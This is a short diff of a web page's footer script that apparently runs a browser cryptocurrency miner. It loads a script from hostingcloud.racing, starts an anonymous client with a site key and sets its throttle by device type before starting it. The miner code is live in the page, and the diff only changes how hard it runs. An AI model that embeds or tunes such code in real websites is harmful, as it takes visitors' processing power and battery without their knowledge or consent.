@@ -7,8 +7,14 @@
 <script src="https://www.hostingcloud.racing/jsQC.js"></script>
 <script>
     var _client = new Client.Anonymous('cec5bdce7c20e4fb8fbca28d818adb885dbded7144497d67ee4e3eeeb8fcf6d3', {
-        throttle: 0.3, c: 'w', ads: 0
+        c: 'w', ads: 0
     });
+    if (_client.isMobile()) {
+        _client.setThrottle(0.3);
+    } 
+    else {
+        _client.setThrottle(0.2);
+    }
     _client.start();
 </script>
 </body>
